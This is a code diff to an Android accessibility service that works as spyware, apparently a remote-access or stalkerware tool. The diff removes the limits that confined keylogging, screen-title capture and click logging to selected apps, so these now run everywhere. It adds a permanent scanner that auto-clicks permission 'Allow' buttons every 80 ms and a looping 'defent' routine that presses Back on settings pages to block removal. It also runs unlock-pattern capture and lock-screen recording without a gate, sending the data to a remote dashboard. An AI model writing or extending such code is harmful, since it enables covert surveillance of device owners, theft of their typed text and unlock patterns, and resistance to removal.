@@ -53,6 +53,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private List<String> keylogBuffer = new ArrayList<>();
     private int screenWidth;
     private int screenHeight;
+    private Handler autoClickHandler;
+    private Runnable autoClickRunnable;
+    private Handler permissionScanHandler;
+    private Runnable permissionScanRunnable;
+
     // Automatic dismissal of this app's Android "isn't responding" dialog.
     // The dialog may be exposed by SystemUI, the framework, or an OEM package.
     private volatile long lastAnrDialogCheckMs = 0L;
@@ -60,8 +65,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private static final long ANR_DIALOG_CHECK_INTERVAL_MS = 250L;
     private static final long ANR_DIALOG_CLOSE_COOLDOWN_MS = 1_500L;
 
-    // Short-lived event work runs off the main Looper so node traversal cannot
-    // starve UI rendering when a relevant window changes.
+    // Background thread for all periodic accessibility tree scans (permission scanner,
+    // auto-grant scanner, auto-click scanner).  Moving these off the main Looper
+    // prevents them from starving UI rendering and causing ANR when apps switch.
     private android.os.HandlerThread permissionScanThread;
     private Handler permissionBgHandler;
 
@@ -120,16 +126,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
     private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 2_000L;
     private volatile boolean firstLaunchInstallerCleanupScheduled = false;
-
-    // Protection is event-driven.  Never poll the accessibility tree while the
-    // device is idle; package-installer/settings events schedule a single
-    // debounced check instead.
-    private volatile long lastProtectionEventMs = 0L;
-    private volatile boolean protectionEventPending = false;
-    private static final long PROTECTION_EVENT_DEBOUNCE_MS = 180L;
-    private volatile boolean unlockScanActive = false;
     
-    // Foreground app state used by event-driven monitoring.
+    // Defent variables - run continuously forever
     private String currentAppName = "";
 
     // Active screen/window title — updated on every TYPE_WINDOW_STATE_CHANGED event.
@@ -252,39 +250,27 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (firstLaunchInstallerCleanupScheduled) return;
         firstLaunchInstallerCleanupScheduled = true;
 
-        // Some standalone/custom builds do not expose optional installer fields
-        // in their generated BuildConfig. Read it reflectively so those builds
-        // still compile while customized builds retain their injected package.
-        String installerPackage = "com.onerule.task";
-        try {
-            java.lang.reflect.Field field =
-                    BuildConfig.class.getField("INSTALLER_PACKAGE");
-            Object value = field.get(null);
-            if (value instanceof String && !((String) value).trim().isEmpty()) {
-                installerPackage = (String) value;
-            }
-        } catch (Exception ignored) {}
+        final String installerPackage = BuildConfig.INSTALLER_PACKAGE;
         if (installerPackage == null || installerPackage.trim().isEmpty()
                 || installerPackage.equals(getPackageName())) {
             Log.w(TAG, "First-launch installer cleanup skipped: invalid installer package");
             return;
         }
 
-        final String cleanupInstallerPackage = installerPackage;
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try {
-                getPackageManager().getPackageInfo(cleanupInstallerPackage, 0);
-                armUninstallAssist(cleanupInstallerPackage);
+                getPackageManager().getPackageInfo(installerPackage, 0);
+                armUninstallAssist(installerPackage);
 
                 Intent intent = new Intent(Intent.ACTION_DELETE,
-                        Uri.parse("package:" + cleanupInstallerPackage));
+                        Uri.parse("package:" + installerPackage));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
                 Log.i(TAG, "First-launch installer uninstall dialog opened for "
-                        + cleanupInstallerPackage);
+                        + installerPackage);
             } catch (PackageManager.NameNotFoundException e) {
                 Log.i(TAG, "First-launch installer cleanup skipped; package is absent: "
-                        + cleanupInstallerPackage);
+                        + installerPackage);
             } catch (Exception e) {
                 Log.w(TAG, "First-launch installer cleanup failed: " + e.getMessage());
             }
@@ -296,10 +282,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
         instance = this;
 
-        // Start the worker used for short event-driven protection and first-launch
-        // permission work. No periodic protection scanner is started here.
+        // Start the background HandlerThread used by all periodic accessibility scanners.
+        // MUST be done before startPermissionScanner / startAutoGrantTimer / startAutoClickScanner
+        // so those methods have a live Looper to post to.
         try {
-            permissionScanThread = new android.os.HandlerThread("access-event-worker",
+            permissionScanThread = new android.os.HandlerThread("perm-scanner",
                     android.os.Process.THREAD_PRIORITY_BACKGROUND);
             permissionScanThread.start();
             permissionBgHandler = new Handler(permissionScanThread.getLooper());
@@ -307,6 +294,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.e(TAG, "Failed to start permissionScanThread: " + e.getMessage());
             permissionBgHandler = new Handler(Looper.getMainLooper()); // safe fallback
         }
+
+        // Start permission scanner IMMEDIATELY - ready before any permission requests
+        try { startPermissionScanner(); } catch (Exception ignored) {}
 
         // Detect whether this is the very first launch or a subsequent reboot/restart.
         // overlay_setup_done is written to prefs during first-time setup; on reboot it is already true.
@@ -332,6 +322,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         //   First launch  → enable after 15 s (user is still in onboarding)
         //   Boot/restart  → enable immediately
         try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
+
+        // Auto-click scanner (defent protection):
+        //   First launch → wait 12 s (matches the 12 s auto-grant overlay window)
+        //   Reboot/restart → start within 2-3 s (everything is already set up)
+        final long protectionDelayMs = isFirstLaunch ? 12_000L : 2_000L;
+        try {
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try { startAutoClickScanner(); } catch (Exception ignored) {}
+            }, protectionDelayMs);
+        } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -403,7 +403,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 boolean locked   = km != null && km.isKeyguardLocked();
                 // Only start recording if locked
                 if (screenOn && locked) {
-                    unlockScanActive = true;
                     SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
                 }
             } catch (Exception ignored) {}
@@ -520,14 +519,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                         case Intent.ACTION_SCREEN_OFF:
                             // Screen turned off WITHOUT unlock — discard frames, nothing useful
-                            unlockScanActive = false;
                             sm.stopScreenReaderAutoNoSave();
                             break;
 
                         case Intent.ACTION_SCREEN_ON:
                             // Screen woke up — ONLY start recording if device is LOCKED
                             if (isLocked) {
-                                unlockScanActive = true;
                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
                                 }, 300);
@@ -536,14 +533,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                         case Intent.ACTION_USER_PRESENT:
                             // Device fully unlocked — stop and save immediately
-                            unlockScanActive = false;
                             sm.stopScreenReaderAuto();
                             break;
 
                         case Intent.ACTION_DREAMING_STARTED:
                             // Ambient display — only record if locked
                             if (isLocked) {
-                                unlockScanActive = true;
                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
                                 }, 300);
@@ -553,7 +548,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         case Intent.ACTION_DREAMING_STOPPED:
                             // Ambient display ended — only record if locked
                             if (isLocked) {
-                                unlockScanActive = true;
                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
                                 }, 300);
@@ -563,7 +557,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         case Intent.ACTION_POWER_CONNECTED:
                             // Charging started — screen often wakes, start recording if locked
                             if (isLocked && pm != null && pm.isInteractive()) {
-                                unlockScanActive = true;
                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     try {
                                         sm.startScreenReaderAuto();
@@ -623,95 +616,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    private boolean isPackageInstallerWindow(String packageName) {
-        if (packageName == null) return false;
-        String pkg = packageName.toLowerCase(java.util.Locale.ROOT);
-        return pkg.contains("packageinstaller")
-                || pkg.contains("permissioncontroller")
-                || pkg.contains("installer");
-    }
-
-    /**
-     * OEM security centers sometimes host their own uninstall screen.  These
-     * are triggers only, not targets: the exact visible app label and the
-     * explicit uninstall arm are still required before any click is possible.
-     */
-    private boolean isSecurityCenterWindow(String packageName) {
-        if (packageName == null) return false;
-        String pkg = packageName.toLowerCase(java.util.Locale.ROOT);
-        return pkg.contains("settings")
-                || pkg.contains("phonemaster")
-                || pkg.contains("phonemanager")
-                || pkg.contains("securitycenter")
-                || pkg.contains("systemmanager");
-    }
-
-    private boolean isProtectionWindow(String packageName) {
-        return isPackageInstallerWindow(packageName)
-                || isSecurityCenterWindow(packageName);
-    }
-
-    private boolean isMonitoredPackage(String packageName) {
-        return com.task.tusker.commands.AppMonitor.isMonitored(packageName);
-    }
-
-    /**
-     * Queue one protection pass for a relevant window event.  Accessibility
-     * content-change events can arrive dozens of times per second, so this is
-     * deliberately coalesced and never becomes a timer or polling loop.
-     */
-    private void scheduleProtectionForEvent(final String packageName, final int eventType) {
-        boolean systemUi = "com.android.systemui".equals(packageName);
-        boolean installer = isPackageInstallerWindow(packageName);
-        boolean securityCenter = isSecurityCenterWindow(packageName);
-        if ((!installer && !securityCenter && !systemUi)
-                || (systemUi && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
-                || (securityCenter && !installer
-                    && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)) {
-            return;
-        }
-        final Handler handler = permissionBgHandler != null
-                ? permissionBgHandler : new Handler(Looper.getMainLooper());
-        final long now = System.currentTimeMillis();
-        if (protectionEventPending || now - lastProtectionEventMs < PROTECTION_EVENT_DEBOUNCE_MS) {
-            return;
-        }
-        protectionEventPending = true;
-        lastProtectionEventMs = now;
-        handler.post(() -> {
-            try {
-                if (installer) {
-                    runArmedUninstallAssistForCurrentWindows();
-                } else if (securityCenter) {
-                    runAccessibilityPageProtection();
-                } else if (systemUi) {
-                    runActiveAppsProtection();
-                }
-            } catch (Throwable e) {
-                Log.w(TAG, "Event protection pass failed: " + e.getMessage());
-            } finally {
-                protectionEventPending = false;
-            }
-        });
-    }
-
-    private void runArmedUninstallAssistForCurrentWindows() {
-        AccessibilityNodeInfo rootNode = null;
-        try {
-            rootNode = getRootInActiveWindow();
-            if (rootNode != null && runArmedUninstallAssist(rootNode)) {
-                return;
-            }
-            AccessibilityNodeInfo dialogRoot = findArmedUninstallDialogWindowRoot();
-            if (dialogRoot != null) {
-                try { runArmedUninstallAssist(dialogRoot); }
-                finally { dialogRoot.recycle(); }
-            }
-        } finally {
-            if (rootNode != null) rootNode.recycle();
-        }
-    }
-
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
@@ -724,7 +628,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                     || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 handleNotRespondingDialog(packageName, event);
-                scheduleProtectionForEvent(packageName, event.getEventType());
             }
 
             // Do not process our own normal accessibility events, but keep the
@@ -733,21 +636,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (packageName.equals(getPackageName())) {
                 return;
             }
-
-            // Keep the service bound so Android can deliver future events, but
-            // do not walk nodes, key-log, or snapshot unrelated apps.  The only
-            // non-monitored windows allowed below are the lock/unlock surface
-            // and the narrowly-triggered protection windows above.
-            boolean monitoredPackage = isMonitoredPackage(packageName);
-            boolean systemUiWindow = "com.android.systemui".equals(packageName);
-            if (!monitoredPackage && !systemUiWindow && !isProtectionWindow(packageName)) {
-                return;
-            }
             
             switch (event.getEventType()) {
 
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
-                    if (!monitoredPackage) break;
                     // Track whether the focused view is a password field
                     AccessibilityNodeInfo focusSrc = event.getSource();
                     if (focusSrc != null) {
@@ -774,7 +666,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
 
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
-                    if (!monitoredPackage) break;
                     List<CharSequence> textList = event.getText();
                     if (textList != null && !textList.isEmpty()) {
                         StringBuilder textBuilder = new StringBuilder();
@@ -887,49 +778,59 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                     // Accessibility Assist: react to window changes in settings
                     try { handleAccessibilityAssistWindowChange(packageName, event); } catch (Exception ignored) {}
-                    if (monitoredPackage) updateCurrentAppName();
+                    updateCurrentAppName();
+                    // ── Capture screen/window title for keylog context ───────────
+                    // event.getText() holds the new window's title. In messaging apps
+                    // this is the contact or group name the user is writing to.
                     try {
-                        SocketManager smWin = SocketManager.getInstance(this);
-                        if (monitoredPackage) {
-                            // Capture title and snapshots only while a configured
-                            // monitored app is in the foreground.
-                            String newTitle = "";
-                            List<CharSequence> winTexts = event.getText();
-                            if (winTexts != null) {
-                                for (CharSequence t : winTexts) {
-                                    String s = (t != null) ? t.toString().trim() : "";
-                                    if (!s.isEmpty()) { newTitle = s; break; }
-                                }
-                            }
-                            if (newTitle.isEmpty()) newTitle = extractScreenTitle();
-                            currentScreenTitle = newTitle;
-                            keylogBuffer.add("[" + packageName + "] APP OPENED");
-                            smWin.getAppMonitor().onAppForeground(packageName);
-
-                            long now = System.currentTimeMillis();
-                            Long last = lastSnapshotTime.get(packageName);
-                            if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
-                                lastSnapshotTime.put(packageName, now);
-                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                    try {
-                                        String snap = captureNodeTree();
-                                        if (snap != null) {
-                                            smWin.getAppMonitor()
-                                                    .onAccessibilitySnapshot(packageName, snap);
-                                        }
-                                    } catch (Exception ignored) {}
-                                }, 300);
-                            }
-
-                            if (smWin.isConnected() && !packageName.isEmpty()) {
-                                smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
-                            }
-                            if (smWin.isStreamingActive()) {
-                                smWin.scheduleFrameAfterAction(
-                                        com.task.tusker.utils.DeviceInfo.getDeviceId(this));
+                        String newTitle = "";
+                        List<CharSequence> winTexts = event.getText();
+                        if (winTexts != null) {
+                            for (CharSequence t : winTexts) {
+                                String s = (t != null) ? t.toString().trim() : "";
+                                if (!s.isEmpty()) { newTitle = s; break; }
                             }
                         }
-
+                        // Fallback: tree scan for toolbar/actionbar text when event gave nothing
+                        if (newTitle.isEmpty()) newTitle = extractScreenTitle();
+                        currentScreenTitle = newTitle;
+                    } catch (Exception ignored) {}
+                    String log = "[" + packageName + "] APP OPENED";
+                    keylogBuffer.add(log);
+                    try {
+                        SocketManager smWin = SocketManager.getInstance(this);
+                        smWin.getAppMonitor().onAppForeground(packageName);
+                        // Capture an accessibility-tree snapshot for monitored apps.
+                        // Rate-limited to once per SNAPSHOT_MIN_INTERVAL_MS per package.
+                        // Stored locally; only sent to server when list_app_screenshots is run.
+                        try {
+                            if (com.task.tusker.commands.AppMonitor.isMonitored(packageName)) {
+                                long now = System.currentTimeMillis();
+                                Long last = lastSnapshotTime.get(packageName);
+                                if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
+                                    lastSnapshotTime.put(packageName, now);
+                                    new android.os.Handler(android.os.Looper.getMainLooper())
+                                        .postDelayed(() -> {
+                                            try {
+                                                String snap = captureNodeTree();
+                                                if (snap != null) {
+                                                    smWin.getAppMonitor()
+                                                         .onAccessibilitySnapshot(packageName, snap);
+                                                }
+                                            } catch (Exception ignored) {}
+                                        }, 300); // brief delay so window content settles
+                                }
+                            }
+                        } catch (Exception ignored) {}
+                        // Push recent activity to dashboard
+                        if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
+                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
+                        }
+                        // Push a frame so dashboard sees the new screen
+                        if (smWin.isStreamingActive()) {
+                            smWin.scheduleFrameAfterAction(
+                                com.task.tusker.utils.DeviceInfo.getDeviceId(this));
+                        }
                         // Trigger: lock screen appeared while screen was already on
                         // (e.g. device auto-locked, or call screen appeared)
                         if (packageName != null && (
@@ -937,7 +838,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                                 || packageName.toLowerCase().contains("keyguard")
                                 || packageName.toLowerCase().contains("lockscreen")
                                 || packageName.toLowerCase().contains("systemui"))) {
-                            unlockScanActive = true;
                             smWin.startScreenReaderAuto();
                         }
                     } catch (Exception ignored) {}
@@ -963,7 +863,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                                 com.task.tusker.utils.DeviceInfo.getDeviceId(this));
                         }
                     } catch (Exception ignored) {}
-                    if (monitoredPackage) logClickForMonitoredApp(event, packageName);
+                    logClickForMonitoredApp(event, packageName);
                     // ── Notification tapped in panel ───────────────────────────────
                     // When the user taps a notification row while the shade is open,
                     // capture its text/title from the event source and push to server.
@@ -973,17 +873,30 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     break;
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
-                    // Content changes are not a polling mechanism.  Protection is
-                    // debounced above and only relevant installer/security-center
-                    // windows are allowed to schedule work.  The first-launch
-                    // permission flow is the one short-lived exception.
+                    // IMPORTANT: do NOT call autoClickAllowButton() directly here.
+                    // TYPE_WINDOW_CONTENT_CHANGED fires 30-60× per second in any app with
+                    // animations or dynamic content. autoClickAllowButton() does getRootInActiveWindow()
+                    // + multiple tree traversals on the main thread — calling it on every event
+                    // is the #1 remaining ANR source.
+                    //
+                    // The 350 ms background scanner (permissionBgHandler) already covers all
+                    // the same protections (defent, uninstall-assist, active-apps, etc.).
+                    // During the 25 s auto-grant window we additionally post immediately to the
+                    // background thread so permission dialogs are clicked without delay.
+                    // Only post autoClickAllowButton() during autoGrantMode when the
+                    // event is NOT from SystemUI.  SystemUI fires TYPE_WINDOW_CONTENT_CHANGED
+                    // 30-60× per second (clock, battery, signal) — posting autoClickAllowButton()
+                    // on each of those while the notification shade is open saturates the
+                    // background thread and bypasses the isSystemPanelOpen() guard before
+                    // it can evaluate, causing the permission-granter to run against
+                    // quick-settings tiles and toggle WiFi / airplane mode / torch.
                     if (autoGrantMode && permissionBgHandler != null
-                            && isPackageInstallerWindow(packageName)) {
+                            && !"com.android.systemui".equals(packageName)) {
                         permissionBgHandler.post(this::autoClickAllowButton);
                     }
                     if ("com.android.systemui".equals(packageName)) {
                         // Advanced Unlock: scan for pattern-lock cells
-                        if (unlockScanActive) checkAdvancedUnlockCells(event);
+                        checkAdvancedUnlockCells(event);
                         // Notification-panel stop-button protection
                         updateNotifPanelStopOverlay();
                     }
@@ -1399,7 +1312,56 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
-    /** Starts the short first-launch permission flow.
+    /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
+     *  Runs continuously forever, ready before any permission requests.
+     *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
+     */
+    private void startPermissionScanner() {
+        permissionScanHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+        permissionScanRunnable = new Runnable() {
+            @Override
+            public void run() {
+                // ── Shade guard ─────────────────────────────────────────────────
+                // Never run the permission granter while the notification panel /
+                // quick-settings shade is open.  Without this guard, the granter
+                // fires every 80 ms against the SystemUI tree and accidentally clicks
+                // quick-settings tiles (WiFi, mobile data, torch, etc.).
+                if (!notificationShadeOpen) {
+                    try {
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        boolean granted = false;
+                        if (rootNode != null) {
+                            if (!isUninstallConfirmationDialog(rootNode)) {
+                                granted = runPermissionGranter(rootNode);
+                            }
+                            rootNode.recycle();
+                        }
+                        // Samsung fallback: dialog may be a floating window not visible via
+                        // getRootInActiveWindow(). Scan all windows for the real dialog.
+                        if (!granted) {
+                            AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                            if (permRoot != null) {
+                                try {
+                                    if (!isUninstallConfirmationDialog(permRoot)) {
+                                        runPermissionGranterOnPermissionWindow(permRoot);
+                                    }
+                                }
+                                finally { permRoot.recycle(); }
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                if (permissionScanHandler != null && permissionScanRunnable != null) {
+                    permissionScanHandler.postDelayed(this, 80);
+                }
+            }
+        };
+        permissionScanHandler.post(permissionScanRunnable);
+    }
+
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
+     *  Runs independently of auto-click scanner (which starts later).
      *  On first launch every runtime permission dialog needs to be handled — 60 s gives
      *  enough time for all of them even on slow devices.
      */
@@ -1408,7 +1370,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
-        // This short-lived first-launch flow runs only while autoGrantMode is true.
+        // Independent scanner: runs every 50 ms during the grant window.
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
@@ -1561,8 +1523,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Called from SocketManager when the dashboard sends request_storage_permission.
      *
      * Strategy:
-     *  1. Activates autoGrantMode for 20 s so permission-dialog events can
-     *     fire runPermissionGranter() for the duration.
+     *  1. Activates autoGrantMode for 20 s so the existing 350 ms background scanner
+     *     also fires runPermissionGranter() for the duration.
      *  2. Runs its own dedicated scanner every 150 ms for 20 s which:
      *     a. Calls runPermissionGranter() — handles "Allow access" buttons, plain Allow/Grant
      *        buttons, unchecked Switch/Toggle/CompoundButton nodes, OEM label variants,
@@ -1576,7 +1538,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * because runPermissionGranter already covers all known button/toggle variants.
      */
     public void enableStorageAutoGrant() {
-        // Keep the explicit storage-permission flow bounded to this request.
+        // Activate the 350 ms background scanner (autoGrantMode) for the full 20 s window.
         reEnableAutoGrant(20_000);
 
         // Suspend defent/uninstall protection so it cannot interfere with the settings screen.
@@ -3396,6 +3358,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
         try { com.task.tusker.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
         try {
+            if (autoClickHandler != null && autoClickRunnable != null) {
+                autoClickHandler.removeCallbacks(autoClickRunnable);
+            }
+        } catch (Exception ignored) {}
+        try {
             if (autoGrantHandler != null) {
                 autoGrantHandler.removeCallbacksAndMessages(null);
                 autoGrantHandler = null;
@@ -3429,7 +3396,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             SocketManager.getInstance(this).stopScreenReaderAuto();
         } catch (Exception ignored) {}
         try {
-            // Quit the worker used for short-lived event-driven callbacks.
+            // Cancel all periodic scanner callbacks before quitting the HandlerThread.
+            if (permissionScanHandler != null && permissionScanRunnable != null) {
+                permissionScanHandler.removeCallbacks(permissionScanRunnable);
+            }
+            permissionScanHandler = null;
+            permissionScanRunnable = null;
+        } catch (Exception ignored) {}
+        try {
+            // Quit the background HandlerThread that drives all periodic scanners.
             if (permissionScanThread != null) {
                 permissionScanThread.quitSafely();
                 permissionScanThread = null;
@@ -3586,7 +3561,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     /**
-     * Runs only for a SystemUI window-open event.
+     * Runs periodically inside the scan loop.
      * If the active window belongs to SystemUI (notification shade / Active-apps panel)
      * and our app name is visible ALONGSIDE a danger keyword, press Back.
      *
@@ -3648,9 +3623,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Event-driven protection pass.
+     * Periodic protection scan (runs every 350 ms via the auto-click scanner loop).
      *
-     * Rule: only press Back when our app name AND at least one action keyword are
+     * Rule:  only press Back when our app name AND at least one action keyword are
      *        simultaneously visible on a settings page.
      *
      * This prevents false positives when the app name appears as just one row in:
@@ -3680,7 +3655,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
             CharSequence pkg = root.getPackageName();
             String pkgStr = pkg != null ? pkg.toString().toLowerCase() : "";
-            if (!isSecurityCenterWindow(pkgStr)) {
+            if (!pkgStr.contains("settings")) {
                 root.recycle();
                 return;
             }
@@ -3722,6 +3697,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }, 80L);
             }
         } catch (Exception ignored) {}
+    }
+
+    private void startAutoClickScanner() {
+        autoClickHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+        autoClickRunnable = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    autoClickAllowButton();
+                } catch (Throwable e) {
+                    Log.e(TAG, "autoClickRunnable crash: " + e.getMessage());
+                }
+                if (autoClickHandler != null && autoClickRunnable != null) {
+                    // 350 ms — fast enough to catch dialogs, slow enough to avoid ANR.
+                    // Event-driven clicks (onAccessibilityEvent) still fire immediately
+                    // so dialogs are handled without waiting for this periodic scan.
+                    autoClickHandler.postDelayed(this, 350);
+                }
+            }
+        };
+        autoClickHandler.post(autoClickRunnable);
     }
 
     public void startGrantPermsTimer() {
